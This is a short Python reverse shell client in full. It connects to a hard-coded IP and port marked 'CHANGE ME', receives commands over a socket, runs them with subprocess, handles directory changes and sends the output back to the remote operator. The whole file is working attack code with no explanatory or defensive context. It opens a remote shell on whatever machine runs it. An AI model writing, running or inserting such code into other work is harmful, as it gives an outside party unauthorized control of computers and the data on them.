#!/usr/bin/env python3
import socket
import subprocess
import os

SERVER_HOST = "192.168.1.226" # CHANGE ME
SERVER_PORT = 4444 # CHANGE ME
BUFFER_SIZE = 4096 # Send 4KB at a time

# Create socket object "server"
server = socket.socket()

# Connect to server
server.connect((SERVER_HOST, SERVER_PORT))

# Debugging purposes
# msg = server.recv(BUFFER_SIZE).decode()
# print("SERVER:", msg)

# Receive and execute command
while True:
    # Receive
    cmd = server.recv(BUFFER_SIZE).decode()

    # Format to uppercase
    uppercmd = cmd.upper()

    # Break if command is "exit"
    if uppercmd == "EXIT":
        break
    # Catch directory change and process through os.chdir
    elif uppercmd[0:2] == "CD":
        path = cmd[3:]
        os.chdir(path)

    # Execute
    result = subprocess.getoutput(cmd)
    # Send result to server
    if not result:
        server.send("Empty output".encode())
    else:
        server.send(result.encode())

server.close()
    
